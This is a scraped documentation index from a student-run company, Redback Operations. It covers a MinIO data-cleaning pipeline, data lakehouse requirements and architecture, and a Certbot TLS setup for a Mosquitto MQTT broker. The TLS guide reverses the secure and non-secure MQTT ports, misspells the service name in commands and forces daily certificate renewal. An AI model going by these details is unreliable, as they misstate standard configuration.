Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/POC#project-overview","content":" The goal of this Proof of Concept is to demonstrate the feasibility and functionality of a data pipeline that processes raw CSV files stored in MinIO buckets, performs data cleaning/preprocessing, and uploads the processed data to another MinIO bucket for further analysis. The system is designed to efficiently handle CSV files, address data quality issues, and provide a seamless transition from raw data (Bronze bucket) to processed, clean data (Silver bucket).  ","version":"Next","tagName":"h2"},{"title":"Objectives​","type":1,"pageTitle":"Proof of Concept: Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/POC#objectives","content":" Verify MinIO Connectivity: Ensure the MinIO client can successfully connect to the server using provided credentials and list available buckets.Download Files from Source Buckets: Retrieve CSV files from designated project buckets (project-2, project-3) and transfer them to the dw-bucket-bronze bucket for raw storage.Data Preprocessing: Implement preprocessing steps to clean the raw data by removing empty columns, filling missing values, and standardizing the structure of the dataset.Upload Preprocessed Files to Silver Bucket: Upload the cleaned CSV files to the dw -bucket-silver bucket for further analysis.Automation: Provide the capability to process multiple files and automate the workflow for future datasets.  ","version":"Next","tagName":"h2"},{"title":"Components Involved​","type":1,"pageTitle":"Proof of Concept: Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/POC#components-involved","content":" MinIO: An object storage solution used to store raw and processed data in structured buckets.MinIO Python Client (minio SDK): A Python library used to interact with MinIO, manage files, and move data between buckets.Pandas: A Python library used for data processing, including handling missing values, removing empty columns, and transforming data.Logging: Python’s logging module is used to track processing progress, errors, and completion.  ","version":"Next","tagName":"h2"},{"title":"Steps Demonstrated in PoC​","type":1,"pageTitle":"Proof of Concept: Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/POC#steps-demonstrated-in-poc","content":" MinIO Client Setup The MinIO client was successfully initialized with environment variables for the host, access key, and secret key. A function was developed to list all available buckets in MinIO, ensuring that the connection is active and functioning. Verification: Listing the available buckets confirmed connectivity to the MinIO server. File Handling and Transfer The next step was to download CSV files from the project-2 and project-3 buckets into the dw -bucket-bronze bucket. A naming convention was applied to each file, ensuring consistency in file naming based on the project name, dataset description, and a timestamp. Verification: Files were successfully transferred from the source buckets to the Bronze bucket with the correct naming convention. Data Preprocessing CSV files from the Bronze bucket were pre-processed by: Removing Empty Columns: Columns that had no data were automatically dropped.Handling Missing Values: Numeric columns with missing values were filled with the column’s median value.Header Validation: For files with potential missing headers, the first row was used as a header, and preprocessing was adjusted accordingly.Verification: Preprocessing successfully cleaned the data, ensuring it was ready for further use. File Upload to Silver Bucket The processed files were then uploaded to the dw-bucket-silver bucket for storage. This separates the raw, uncleaned data (Bronze) from the cleaned and ready-to-use data (Silver). Verification: Processed files were successfully uploaded to the Silver bucket with the correct file structure. Error Handling and Logging The PoC includes robust error handling for common issues, such as failed file downloads or invalid CSV structures. Logging is used throughout to track progress, flag errors, and confirm successful uploads. Verification: The system successfully logged key actions, and any issues during file transfer or processing were handled with appropriate warnings or errors.  ","version":"Next","tagName":"h2"},{"title":"Challenges Identified​","type":1,"pageTitle":"Proof of Concept: Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/POC#challenges-identified","content":" Handling files without headers required additional validation and preprocessing logic.Some datasets required more complex handling of missing values, which could lead to additional customization in the pipeline.  ","version":"Next","tagName":"h2"},{"title":"Next Steps​","type":1,"pageTitle":"Proof of Concept: Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/POC#next-steps","content":" Testing at Scale: Validate the system’s functionality with larger datasets and more files to ensure that the pipeline can handle high-volume operations efficiently.Automation: Automate the process to continuously monitor the source buckets and automatically trigger preprocessing and uploads when new files are added.Security Enhancements: Implement access controls to ensure that only authorized users can upload or modify files in the buckets.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Proof of Concept: Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/POC#conclusion","content":" The Proof of Concept successfully demonstrates that the data preprocessing pipeline can be implemented in MinIO using Python. CSV files can be downloaded, cleaned, and moved between buckets efficiently, with clear logging and error handling in place. The pipeline is ready for scaling, automation, and integration into broader data workflows at Redback Operations. ","version":"Next","tagName":"h2"},{"title":"Data Warehouse Requirements","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements","content":"","keywords":"","version":"Next"},{"title":"Background​","type":1,"pageTitle":"Data Warehouse Requirements","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements#background","content":" Redback Operations is currently without a permanent scalable contemporary data solution.  While workarounds currently exist, such as storing data in GitHub folders or on the personal computers of company members this is far from best-practice and doesn’t represent a sustainable longer-term solution.  While pervious work has been dedicated to a data warehouse solution and the ‘Project 4 - Data Warehousing Team’ is underway this trimester, both have given results with a focus on meeting short-term requirements in an ad-hoc fashion. These endeavours brought success for what was required under the constraints of a two-trimester unit and given the nature of the capstone program with the considerable budgetary and limited working hours. It is commendable the progress made so far is of such a high quality.  The purpose of this document is to present information on how data is currently used in Redback Operations and present a set of options which, if executed aim to improve the way data is to be used in the company.  Currently, data is sought out only when it is needed to be accessed, processed, utilized, and then most likely saved or discarded once it is no longer required. Within this process, includes a series of unnecessary steps which can be simplified or reduced, made more efficient, replaced or removed all together with a proper data model, data architecture, engineering, and data-lifecycle.  The first step, and that being the focus of this document and Project 4 is to establish what’s required from a potential Data Lakehouse. A proper best-practice data solution should not be acquiring hardware or software without considering and migrating across all records from existing storage solutions and continuing from there. Nor does it involve opening the gates for Junior and Senior company members to spin-up storage space, create and populate their own folders for storage without any guidance or overall modelling and data-lifecycle to ensure efficient use of resources. A Redback Operations data solution must begin with a cycle of planning as with any other project before jumping straight into a solution. While a data warehouse or data storage solution is a key component of the overall goal, to properly implement a data solution in line with an industry standard would mean a complete overhaul of the existing data processes for Redback (in some cases implementing for a lack of current data processes). This would consist of a body of work more akin to a ‘Data Transformation’ than a Data warehouse implementation.  While planning and implementing a project of this size given the timeframe would be ambitious for any company. A data transformation would require an introduction of many fundamental aspects typical of a high-functioning data department. This better ensures a solution foundation rooted in industry standards, including appropriate data architecture, data modelling, overall data framework, insights management and data security.  ","version":"Next","tagName":"h2"},{"title":"A Note on Data Warehouse​","type":1,"pageTitle":"Data Warehouse Requirements","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements#a-note-on-data-warehouse","content":" ‘Data Warehouse Team’ is this company’s project allocated to a data storage solution, as has been the project objective since its inception.  The project name has been appropriate for general understanding given that practically yes, this project aims to implement a data storage solution, however; if any recommendation of this document is to be approved and bring the project up to industry standards and best practices, the projects objective would be looking to acquire and implement a state-of-the-art Data Lakehouse or similar company-wide data storage solution no longer a standalone Data Warehouse for one project alone.    ","version":"Next","tagName":"h2"},{"title":"The Plan​","type":1,"pageTitle":"Data Warehouse Requirements","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements#the-plan","content":" A proposed data transformation requires input from a wide variety of stakeholders and would require a separate document.  A proposed plan may look like:  Requirements Gathering​  Requirements gathering process including survey results and Requirements gathering document.  Assess current infrastructure​  Gather information on the current data architecture/lack of.  Options paper, Choosing a platform​  Storage layer Platform Options paper document  Design Architecture​  Data ingestion Storage Processing Analytics Data governance  Data ingestion​  Part of the platform decision  Data Storage​  Virtual machine Cloud storage  Data Query and Analytics​  Review tool stack for data analytics, Power BI, Tableau  Security and governance​  Define access and encryption policies for sensitive data  Training and documentation​  How-to’s and documentation Decision register Project retrospective  ","version":"Next","tagName":"h2"},{"title":"Requirements Gathering​","type":1,"pageTitle":"Data Warehouse Requirements","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements#requirements-gathering-1","content":" The first stage of the data transformation involves requirements gathering, searching for pain points, and understanding how the company uses its data. Background documentation and consultation with company data stakeholders indicates prior requirements gathering has not been performed beyond a surface level and has been limited to the domain of Data warehouse leaders and some other key stakeholders.  Rigorous requirements gathering allows for an overall understanding of how the company uses its data, this in-turn gives a greater understanding of what is required to improve the data solution and helps to focus the scope when going to market for a SaaS solution or whether there is even need for a solution at all.  So far, as part of the requirements gathering process we have conducted five meetings with leaders from projects in the company.  The current Redback company projects (Trimester 1 2024), their data and the upcoming requirements gathering phases.  ","version":"Next","tagName":"h2"},{"title":"Pain Points​","type":1,"pageTitle":"Data Warehouse Requirements","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements#pain-points","content":" The results of a requirements gathering process at the beginning of Trimester 1 2024 indicate pain points of:  There currently isn’t an easy way to update the dataset for the various data analytics sources. Currently they must go through a GitHub fork/pull request.  The solution needs to have the capability to store unstructured, NoSQL objects and structured data.  Limited budget, subject to approval at all phases.  Preferably a more common language/low code approach for upskilling, due to high student turnover given nature of the capstone unit.  There is no central ‘repository’ for storing company wide data, adding steps to potential collaboration. No shared Data Lake that projects can derive insights from.  Individual user licenses present an obstacle every trimester, given student turnover.  Project 3 Data Pipeline  ","version":"Next","tagName":"h2"},{"title":"Requirements gathering is an ongoing process​","type":1,"pageTitle":"Data Warehouse Requirements","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements#requirements-gathering-is-an-ongoing-process","content":" A second requirements gathering exercise in the form of a survey is planned for Trimester 1 University week 6 (08/04/2024).  Data Lifecycle comparisons  So far, the pain points from the interview process alone can be summarized as requirements and favorable key features for a Data Lakehouse/Data solution. These become important to critique the suitability of options when choosing Redbacks Data Lakehouse.  ➢ Large enough to support the current data storage requirements. ➢ Easily scalable to incorporate future projects and data requirements. ➢ Unstructured file storage, to support projects with object storage requirements. ➢ Cost effective, with a free trial or free forever tier to begin with. ➢ Ease of use and minimal upskilling will be favored. Commonality taken into consideration. ➢ Contemporary solutions, Redback Operations projects all have state-of-the-art objectives, and a data solution should be no different. ➢ Preferably an enterprise-wide solution not individual user-based licensing.  ","version":"Next","tagName":"h2"},{"title":"Survey​","type":1,"pageTitle":"Data Warehouse Requirements","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements#survey","content":" While company and project leaders have been consulted in meetings, end users will be offered a survey to gather how the majority of company members use data, mainly focused on members who aren’t directly involved in a data analysis/data science project. (Consultation of the Epic 2 - Data Analysis group is ongoing)  You can find the results from the week 6 survey here  The goal of the survey is to add to the overall requirements gathering process, namely how Redbacks company’s and non-data focused users currently use data, given the preliminary requirements gathered.    ","version":"Next","tagName":"h2"},{"title":"Options​","type":1,"pageTitle":"Data Warehouse Requirements","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements#options","content":" The following options in this document represent a result of a formal process of requirements gathering through questioning and interviewing key stakeholders in Redback to assess pain points as well as researching industry leaders and trusted comparison companies, consultation from outside sources including industry professionals and individual set-up/testing each technology.  The six options in this document are the remainder of an initial field of which each option to qualify was required to meet at least a majority of requirements before each technology was tested to examine a potential use case further.  A final recommendation is planned to be provided after the results of the Requirements survey examined and the larger requirements gathering process concluded to maximize the information in making any decision.  Summary table of Data Lakehouse options  ","version":"Next","tagName":"h2"},{"title":"IOMETE​","type":1,"pageTitle":"Data Warehouse Requirements","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements#iomete","content":"   ","version":"Next","tagName":"h3"},{"title":"N8n​","type":1,"pageTitle":"Data Warehouse Requirements","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements#n8n","content":"   ","version":"Next","tagName":"h3"},{"title":"Dremio​","type":1,"pageTitle":"Data Warehouse Requirements","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements#dremio","content":"   ","version":"Next","tagName":"h3"},{"title":"Microsoft Fabric/Azure​","type":1,"pageTitle":"Data Warehouse Requirements","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements#microsoft-fabricazure","content":"   ","version":"Next","tagName":"h3"},{"title":"MongoDB​","type":1,"pageTitle":"Data Warehouse Requirements","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements#mongodb","content":"   ","version":"Next","tagName":"h3"},{"title":"Apache Hudi​","type":1,"pageTitle":"Data Warehouse Requirements","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements#apache-hudi","content":"   ","version":"Next","tagName":"h3"},{"title":"Data Storage​","type":1,"pageTitle":"Data Warehouse Requirements","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Warehouse Requirements#data-storage-1","content":" Data storage for the initial implementation of the Data Lakehouse platform will be the Deakin virtual machine, this will operate as BareMetal on-premises storage. In future Trimesters there is scope to secure funding for a cloud storage solution. ","version":"Next","tagName":"h2"},{"title":"Certbot – Let's Encrypt TLS solution for Mosquitto MQTT broker","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLS_Proof_of_Concept_plus_automation","content":"","keywords":"","version":"Next"},{"title":"Proof of Concept​","type":1,"pageTitle":"Certbot – Let's Encrypt TLS solution for Mosquitto MQTT broker","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLS_Proof_of_Concept_plus_automation#proof-of-concept","content":" ","version":"Next","tagName":"h2"},{"title":"Retrospective Review​","type":1,"pageTitle":"Certbot – Let's Encrypt TLS solution for Mosquitto MQTT broker","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLS_Proof_of_Concept_plus_automation#retrospective-review","content":" Version\tModified By\tDate\tChanges Madev1.0\tCandice Smith\t03/09/2024\tDocument Creation draft steps for MQTT Server TLS Implementation v2.0\tShalom Ingabo\t05/09/2024\tUpdated all process steps with confirmed process and added screenshots following technical PoC. v3.0\tCandice Smith\t05/09/2024\tFinal formatting of document including division of testing categories, Out of Scope items, etc. v4.0\tCandice Smith\t20/09/2024\tAdded Manik’s script  Steps taken and validated during PoC  ","version":"Next","tagName":"h3"},{"title":"Set Up Test Environment​","type":1,"pageTitle":"Certbot – Let's Encrypt TLS solution for Mosquitto MQTT broker","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLS_Proof_of_Concept_plus_automation#set-up-test-environment","content":" Step 1: Set up EC2 instance  Created a new security group to allow inbound rules for SSH, HTTPS and MQTT (1883 for secure MQTT and 8883 for non-secure MQTT). Since it was only for test purposes, I allowed access source from any IP address, however, in the case of production, this needs to be hardened through IP address access control to allow only the necessary IP addresses for security purposes.    Launch instance and connect via SSH using command:  ssh –i /path/to/your-key.pem ubuntu@&lt;EC2-Public-IP&gt;   Step 2: Link your Domain to the instance  Created a domain using AWS called tlsoluttions.com  We used Route 53 on AWS to create a hosted zone for our domain tlsoluttions.com and did some configurations on the A record to point to our running cloud server instance    Tested domain link using domainchecker to ensure that our domain was being hosted using the IP address of the running instance (takes about 60 seconds for changes to be applied.)  ","version":"Next","tagName":"h2"},{"title":"Set Up Test Mosquitto Broker​","type":1,"pageTitle":"Certbot – Let's Encrypt TLS solution for Mosquitto MQTT broker","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLS_Proof_of_Concept_plus_automation#set-up-test-mosquitto-broker","content":" Step 3: Install mosquitto  Run the commands:  sudo apt update sudo apt install mosquitto mosquitto-clients   in our running instance. This commands updates and install the mosquitto broker to support the MQTT protocol  Step 4: Configure mosquitto for tls  Edited the mosquitto configurations file to support secure connections by running the command:  sudo nano /etc/mosquitto/conf.d/default.conf   Add the following code to enable TLS:  listener 8883 cafile /etc/letsencrypt/live/mqttserver.domain.com/chain.pem certfile /etc/letsencrypt/live/mqttserver.domain.com/fullchain.pem keyfile /etc/letsencrypt/live/mqttserver.domain.com/privkey.pem tls_version tlsv1.2   Explanation of the above code  listener 8883 specifies the port for TLS connections (default is 8883 for TLS).  cafile points to the CA certificate file (part of the Let's Encrypt chain).  certfile points to your server certificate.  keyfile points to your private key.  tls_version specifies the minimum TLS version to use.  Saved the file then restarted mosquitto using command:  sudo systemctl restart mosquito   ","version":"Next","tagName":"h2"},{"title":"Set Up Certbot and Let’s Encrypt Solution​","type":1,"pageTitle":"Certbot – Let's Encrypt TLS solution for Mosquitto MQTT broker","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLS_Proof_of_Concept_plus_automation#set-up-certbot-and-lets-encrypt-solution","content":" Step 5: Install Certbot for Let’s Encrypt TLS Certificates with Apache  Install Certbot and Apcahe plugin using command  Sudo apt install certbot python3-certbot-apache –y   Obtain SSL Certificates using certbot by running the command:  sudo certbot –apache –d tlsoluttions.com -d www.tlsoluttions.com     [successful certificate generation]  In the above command, certbot uses the Apache plugin to automaticallly configure SSL for our site. Certbot will ask you to choose whether you want to redirect HTTP traffic to HTTPS (which is recommended)  Verify Apache SSL configurations by running the command :  sudo nano /etc/apache2/sites-available/000-default-le-ssl.conf   You should be able to see the following lines which tells Apache to use Let’s Encrypt certificates for your domain    Restart Apache to ensure all changes take effect by running the command:  sudo systemctl restart apache2   Step 6: Set up automatic renewal  To force certbot to renew the certificate every day, you can create a cron job that attempts to renew the certificate everyday by running the command:  sudo crontab -e   Add the following line    Explanation of the line  30 2 * * *: This schedules the task to run at 2:30 AM everyday  /usr/bin/certbot renew –force-renewal   This command forces certbot to renew the certificate, even if it has not reached the typical renewal period which is typically 90 days  /var/log/le-renew.log   This appends the output of the command to a log file for review  To check the list of the active timer, run command:  sudo systemctl list-timers and check for certbot.timer     Step 7: Testing automatic renewal  Let’s Encrypt certificates are valid for 90 days, but with the installation of certbot, the renewal process is automated and can be tested by running the command:  sudo certbot renew –dry-run   [successful automated renewal]  [verifying Apache SSL]  Automation – Script  Setup Automation  To streamline the deployment and configuration process, this is an automated script that sets up Mosquitto, configures TLS, installs Certbot, and manages SSL certificates. Below is the script used for this PoC:  The script-  #!/bin/bash sudo apt-get update sudo apt-get install -y mosquitto mosquitto-clients apache2 certbot python3-certbot-apache sudo tee /etc/mosquitto/conf.d/mosquitto_tls.conf &gt; /dev/null &lt;&lt;EOF listener 8883 cafile /etc/letsencrypt/live/YOUR_DOMAIN/fullchain.pem certfile /etc/letsencrypt/live/YOUR_DOMAIN/cert.pem keyfile /etc/letsencrypt/live/YOUR_DOMAIN/privkey.pem tls_version tlsv1.2 EOF sudo a2enmod proxy proxy_http proxy_wstunnel ssl sudo tee /etc/apache2/sites-available/000-default.conf &gt; /dev/null &lt;&lt;EOF &lt;VirtualHost *:80&gt; ServerName YOUR_DOMAIN ProxyPass /mqtt ws://localhost:1883/ ProxyPassReverse /mqtt ws://localhost:1883/ ProxyPass /mqttssl wss://localhost:8883/ ProxyPassReverse /mqttssl wss://localhost:8883/ ErrorLog \\${APACHE_LOG_DIR}/error.log CustomLog \\${APACHE_LOG_DIR}/access.log combined &lt;/VirtualHost&gt; EOF sudo systemctl restart apache2 sudo certbot --apache -d YOUR_DOMAIN sudo mkdir -p /etc/mosquitto/certs sudo cp /etc/letsencrypt/live/YOUR_DOMAIN/fullchain.pem /etc/mosquitto/certs/fullchain.pem sudo cp /etc/letsencrypt/live/YOUR_DOMAIN/privkey.pem /etc/mosquitto/certs/privkey.pem echo &quot;0 3 * * * certbot renew --post-hook 'systemctl restart apache2 &amp;&amp; systemctl restart mosquitto'&quot; | sudo tee -a /var/spool/cron/crontabs/root   Steps to use the script  Create a new file for the script:  nano new_file.sh   Paste the automated script into the file. Make sure to replace YOUR_DOMAIN with your actual domain name  Change the script’s permissions to make it executable:  sudo chmod +x new_file.sh   Execute the script to perform the setup:  sudo ./new_file.sh   Out of Scope  Additional steps and information that may be useful during implementation, deemed out of scope for PoC activity.  Alternative Certbot installation methods for various OS’s can be found here:   Verify config by testing with MQTT Clients  mosquitto_sub -h mqttserver.domain.com -p 8883 -t test/topic \\--cafile /etc/letsencrypt/live/mqttserver.domain.com/chain.pem   *You may need to adjust the port -- please review  In the case a client fails to connect, check Mosquitto logs for errors.  sudo journalctl -u mosquito   Reload Mosquitto config after successful renewal:  sudo nano /etc/letsencrypt/renewal-hooks/post/reload-mosquitto.sh #!/bin/bash systemctl reload mosquitto sudo chmod +x /etc/letsencrypt/renewal-hooks/post/reload-mosquitto.sh   Proof of Concept Outcome  The outcome of this PoC has been to validate the process for the successful deployment of Certbot and Let’s Encrypt to secure a Mosquitto MQTT broker stored on a server utilising Apache as the operating system.  Not only does this provide a validated process for future TLS deployments but also provides a guide to creating a testing environment for any future proof of concept requirements resulting in a much more efficient process and more focus on testing the new technologies rather than the testing environment.  This PoC has resulted in the successful testing of the Certbot – Let's Encrypt TLS solution as applied to our test MQTT broker, with the successful renewal of the deployed certificate. All this is also captured in an easy to run script which will deploy a Mosquitto broker with TLS. ","version":"Next","tagName":"h2"},{"title":"Data Architecture","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture","content":"","keywords":"","version":"Next"},{"title":"Background​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#background","content":" At the end of trimester 3 2023, Reback operations was operating without a data warehouse, the company members were making do with what was available and performing research against alternative storage methods with limited success. Trimester 1 2024 began with the first companywide requirements gathering in an effort to match a potential data warehouse solution correctly with the needs of the company. This process involved interviews with company leaders and a survey for company members, resulting in an accurate list of requirements and a plan for the implementation of a data warehouse solution. Following the requirements gathering activities an accompanying options paper was prepared, as well as a strategy for implementation as well as a change in direction, this change was to explore the deployment of a Data Lakehouse solution.  This decision was presented and discussed and ultimately accepted during Tri 1 2024 panel meetings and has the endorsement of the company leaders and Director.  This document has two purposes; to explain the architecture of the data Lakehouse and how to use/access data in the data Lakehouse.  Selecting the Data Lakehouse platform and associated tools required an extensive decision making process to ensure that the most appropriate supporting technologies were chosen for the data Lakehouse tool. As a result of this Dremio was chosen as the Data Lakehouse platform.  ","version":"Next","tagName":"h2"},{"title":"Data Lakehouse Decision​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#data-lakehouse-decision","content":" Considering multiple options, given the requirements outlined Dremio has been selected as most appropriate option. Dremio was selected as the Data Lakehouse platform given it meets individual team requirements and can also incorporate the Deakin virtual machine as a storage layer.  With the combination of other tools Dremio can operate on top of and query data from the VM’s storage. This is critical because in the absence of a cloud storage budget all software and storage is effectively required to integrate with the VM as a data source to be considered viable. Unfortunately, this disqualified IOmete (a cloud alternative to Dremio) and other cloud-only operating systems for this Trimesters Data Lakehouse decision, when in the event of a cloud storage layer option there was a potential advantages for these platforms as a use-case.  With the requirements given careful thought we can move onto how to access the Data Lakehouse.  ","version":"Next","tagName":"h2"},{"title":"How to use the Data Lakehouse​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#how-to-use-the-data-lakehouse","content":" Firstly, to enter data into the data Lakehouse an admin of the Lakehouse (someone from the data warehouse team) needs to set up a Dremio account on your behalf.  This effectively gives you access to the Lakehouse, with a user account and password.  To keep the data Lakehouse from becoming a data swamp it’s important to have tight governance on how data is stored on the Lakehouse.  It’s proposed that the best practice for redback is to have one user who contributes data to the Lakehouse per team unless required so the overarching data warehouse administration can keep track of data ownership.  For users with access to the data Lakehouse​  There are two forms of data storage:  Structured data, (csv’s flat files)Unstructured data (images, videos or streaming data, Json)  Depending on what type of data you are storing, depends on what process to follow.  Storing flat files/structured data requires following the proposed layout below:​  Ask your team leader who is the data warehouse representative, they will have access to the Data Lakehouse frontend.The Data Warehouse team member can share the link to Dremio, which when followed opens the UI in your browser.Find the folder representing the Team/Project that you are a part of and follow the subfolders to the appropriate level e.g project_6 &gt; 2024 &gt; t1_2024 &gt; sub-project name &gt; task_name &gt; student_ID(optional)Use the upload data function in the folder icon on the right-hand side of the UI.  Using object storage:​  Same as steps 1 &amp; 2 aboveObject storage requires access to Minio, the Data warehouse team manages this set-up.Following the Minio URL provided allows access to create an AWS s3 ‘bucket’, which has some specific naming conventions enforced and supplies some credentials to link to Dremio,The Data Warehouse team can link this to object storage in Dremio, within Minio you can link or upload the object storage directly to the bucket created and once connected in Dremio, the data will be available in the Dremio UI for querying.  Additionally, if required in edge-cases, users may need access to the virtual machine.  ","version":"Next","tagName":"h2"},{"title":"Lakehouse Architecture​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#lakehouse-architecture","content":" Data Lakehouse Architecture is a form of data management that intends to combine the best features of traditional data lakes and data warehouses, this is ideal for Redback operations because as a company we share the same storage system (data lake) while needing individualised places to store the data for each project.  The benefits of Lakehouse architecture have been written about extensively and are utilised by many elite companies however, some key reasons why Redback Operations specifically will benefit from Lakehouse architecture over traditional data warehouse architecture are:  ➢ Storage: the ability to store data in native formats, while remaining scalable ➢ Combined sources: one data Lakehouse can accommodate batch and streaming data sources. ➢ Better governance and schema enforcement: While maintaining flexibility around sources, data Lakehouse’s by design can better enforce formal mechanisms for storing and accessing data, which helps to keep the Lakehouse tidy and efficient, now and moving forward with member turnover. ➢ ML and data science integration: redback has a large contingent of analytics and data science users, a data Lakehouse can be designed in a way to accommodate ‘stages’ of data from ingestion for data engineers (data warehouse) and self-service analytics (Data science teams) while maintaining order and data integrity. ➢ Cost effective: Data Lakehouse architecture is free and can be built on open-source tools.  Finally, the prosed data pipeline ends with access to the data at any level of the medallion architecture. Bronze being raw data, silver being transformed and cleaned data with any necessary merges or appends of other tables and gold a layer of that has analysis ready data with aggregations and a specific scope for a more specific use. This concept is expanded on further later in the document.  Initially we propose that one member of each team interface with Lakehouse to maintain governance over any changes. Having one representative per team ensures no duplication of efforts and a point of contact when tracing actions in the platform.  Each team accesses the Data Lakehouse through a representative  ","version":"Next","tagName":"h2"},{"title":"Modelling Architecture​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#modelling-architecture","content":" Our architecture is made up of an arrangement of folders existing in an iceberg format, stored on a virtual machine accessed and governed by ingestion, cataloging and Lakehouse platform tools.  The layout is integral to the success of the data Lakehouse and is designed with each project redback specific requirements in mind.  The style of the architecture is known as medallion, Bronze, Silver, Gold.  Medallion style architecture is a key aspect of data Lakehouse storage. Each stage (medallion) explained briefly below:  Bronze: The bronze layer is effectively the Data Lake part of the Data Lakehouse. This is where source data is stored as is, so there is consistent source of truth of where any data transformations can be traced back to. The bronze layer isn't accessible by end users and serves as a starting point for the silver and gold layers to build off. Bronze layer will become particularly valuable as a landing folder when orchestration platforms are established and need somewhere to dump data to.  Silver: Flowing on from bronze layer, the silver layer is where the data is first transformed into Iceberg tables, this particular format is explained later in the document, but allows for historical version of data to be stored as snapshots in the same file behind the current data, meaning that in silver we are able to effectively capture and itemise historical data for each source. Silver is also the layer involved in merging, transforming and cleaning the data as tables to prepare them for the gold layer next.  Gold: The Gold layer of the data architecture is where the data that has been cleaned, prepared validated is stored, this data can be accessed directly queried or pushed downstream for use in models. The point of contact for data users.  The Data Lakehouse Layers as medallion architecture  ","version":"Next","tagName":"h2"},{"title":"Folder Architecture​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#folder-architecture","content":" The folder layout for the Data Lakehouse is important to allow for proper governance, by keeping a rigid folder structure users are better able to build pipelines to orchestrate data and to find necessary data when required.  In the event of an orchestration tool this folder style will be flexible to accommodate migration to a more time focused folder layout as it already encourages naming data in a YYYY-MM-DD fashion.  Below is the Data Lakehouse file structure.  The folder layout for the Data Lakehouse  ","version":"Next","tagName":"h2"},{"title":"The Tech Stack​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#the-tech-stack","content":" Data flow through the Data Lakehouse tech stack  ","version":"Next","tagName":"h2"},{"title":"Data Storage​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#data-storage","content":" Our data storage is the Deakin university virtual machine server [ redback.it.deakin.edu.au ] with 500gb of available storage, the VM server is Linux based and can be accessed through command prompt.  It’s important to regularly check the functionality of the VM. Its administration is outside of our control and lies with Deakin IT department.  Virtual machine is the BareMetal storage, in our on-prem architecture, typically and perhaps moving forward could data storage would replace this as part of our data Lakehouse architecture.  ","version":"Next","tagName":"h3"},{"title":"Docker​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#docker","content":" Docker containerises the Lakehouse tools and allows them to be utilised on non-Linux environments. Docker is crucial to running the Lakehouse platform and all the components are run as part of a docker container.  ","version":"Next","tagName":"h3"},{"title":"MinIO​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#minio","content":" Minio is a object storage solution that acts like amazon s3 cloud storage and supplies a compatible API for Dremio to connect to and store all forms of data and bring this through into the Data Lakehouse. Minio compliments Dremio by having a focus on speed, a key requirement for our use case and a reason Dremio was also chosen for the Lakehouse architecture.  Minio User Interface  ","version":"Next","tagName":"h3"},{"title":"Nessie​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#nessie","content":" Nessie is a Data Catalog, that records changes in the data or ‘Transactions’ as the documentation calls it. This program essentially gives the Lakehouse GitHub functionality by way of branching and commit actions. If there is a disaster, the Lakehouse and data can be rolled back to a state before any damage was made.  ","version":"Next","tagName":"h3"},{"title":"Format​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data 